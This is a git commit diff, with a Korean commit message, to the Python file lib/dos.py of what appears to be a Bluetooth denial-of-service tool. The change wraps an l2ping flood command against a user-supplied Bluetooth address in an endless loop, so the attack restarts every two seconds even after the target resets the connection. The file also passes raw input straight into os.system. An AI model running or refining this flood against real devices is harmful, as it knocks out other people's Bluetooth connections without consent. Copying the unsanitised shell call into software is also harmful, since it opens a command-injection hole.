094566567cfbb34d0b7de896b720fd3a68dd275a
cybermad <171419864+cybermads@users.noreply.github.com>
2025-11-22 21:08:59 +0900

    연결 재시도 요청이 와도 이를 무시하고 도스 공격 진행

--- lib/dos.py
+++ lib/dos.py
@@ -1,4 +1,5 @@
 import os
+import time
 
 c = "\033[38;5;117m"
 r = "\033[0m"
@@ -6,7 +7,15 @@ r = "\033[0m"
 def DOS():
     target = input(f"[{c}+{r}] bdaddr   {c}:{r} ")
     packet = input(f"[{c}+{r}] packet   {c}:{r} ")
+    
     print(f"[{c}+{r}] {target} {packet} Attack Started...")
-    os.system(f"l2ping -i hci0 -s {packet} -f {target}")
-    input(f"[{c}+{r}] Finish{c}...{r}")
+    while True:
+        dos = os.system(f"l2ping -i hci0 -s {packet} -f {target}")
+
+        if dos != 0:
+            print(f"[{c}+{r}] Connection reset by peer Retry{c}...{r}")
+        else:
+            print(f"[{c}+{r}] Connection reset by peer Retry{c}...{r}")
+        
+        time.sleep(2)
 
